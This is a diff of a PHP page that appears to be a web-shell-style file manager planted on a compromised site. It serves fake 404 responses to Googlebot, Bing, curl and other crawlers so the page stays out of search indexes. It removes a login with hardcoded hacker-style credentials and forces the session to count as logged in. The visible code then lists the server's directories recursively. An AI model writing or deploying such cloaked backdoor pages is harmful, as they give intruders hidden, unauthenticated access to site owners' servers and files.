@@ -1,25 +1,26 @@
 <?php
-// Daftar User-Agent yang akan diberikan respon 404 Not Found
+session_start();
+
+// Setting session variables for logged-in state
+$_SESSION['loggedin'] = true;
+
 $blockedUserAgents = [
     'Googlebot', 'Slurp', 'MSNBot', 'PycURL', 'facebookexternalhit',
     'ia_archiver', 'crawler', 'Yandex', 'Rambler', 'Yahoo! Slurp',
     'YahooSeeker', 'bingbot', 'curl'
 ];
 
-// Mendapatkan User-Agent dari permintaan
 $userAgent = $_SERVER['HTTP_USER_AGENT'];
 
-// Memeriksa apakah User-Agent yang diterima ada dalam daftar yang diblokir
 foreach ($blockedUserAgents as $blockedUserAgent) {
     if (stripos($userAgent, $blockedUserAgent) !== false) {
-        // Mengatur header respon ke 404 Not Found
         header("HTTP/1.0 404 Not Found");
         echo "404 Not Found";
         exit;
     }
 }
-?>
 
+?>
 <!DOCTYPE html>
 <html>
 <head>
@@ -88,30 +89,6 @@ foreach ($blockedUserAgents as $blockedUserAgent) {
 <body>
 
 <?php
-session_start();
-
-$validUsername = 'JogjaXploit';
-$validPassword = 'Djaya3';
-
-if (isset($_POST['username']) && isset($_POST['password'])) {
-    if ($_POST['username'] === $validUsername && $_POST['password'] === $validPassword) {
-        $_SESSION['loggedin'] = true;
-    } else {
-        echo '<div style="color: red;">Invalid username or password.</div>';
-    }
-}
-
-if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
-    echo '<div class="container">';
-    echo '<h1>Login</h1>';
-    echo '<form method="post">';
-    echo 'Username: <input type="text" name="username"><br>';
-    echo 'Password: <input type="password" name="password"><br>';
-    echo '<input type="submit" value="Login" class="button">';
-    echo '</form>';
-    echo '</div>';
-    exit;
-}
 
 function listDirectory($dir) {
     $files = scandir($dir);
@@ -122,12 +99,10 @@ function listDirectory($dir) {
             $path = $dir . DIRECTORY_SEPARATOR . $file;
             echo '<li>';
             if (is_dir($path)) {
-                // If it's a directory, list it and count files inside
                 echo '<span class="folder" onclick="toggleFolder(this)">' . $file . '</span>';
                 $fileCount += listDirectory($path);
                 echo '<span>Total File: ' . $fileCount . '</span>';
             } else {
-                // If it's a file, display file name, size, and creation date
                 $fileSize = filesize($path);
                 $fileCreationTime = filectime($path);
                 echo $file . ' Size: ' . $fileSize . 'kb , Created: ' . date("Y-m-d H:i:s", $fileCreationTime);
